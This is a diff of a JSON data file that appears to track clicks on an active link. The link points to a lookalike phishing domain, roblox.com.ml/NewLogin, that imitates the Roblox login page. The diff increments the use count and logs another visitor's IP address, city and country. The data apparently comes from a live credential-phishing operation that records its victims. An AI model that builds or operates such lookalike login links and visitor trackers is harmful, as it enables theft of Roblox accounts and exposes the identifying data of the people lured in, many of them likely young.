@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 743,
+    "useCount": 744,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6051,6 +6051,14 @@
       },
       {
         "timestamp": 1777149283192,
+        "ip": "68.216.63.109",
+        "country": "United States",
+        "city": "Pittsburgh",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777149522140,
         "ip": "68.216.63.109",
         "country": "United States",
         "city": "Pittsburgh",
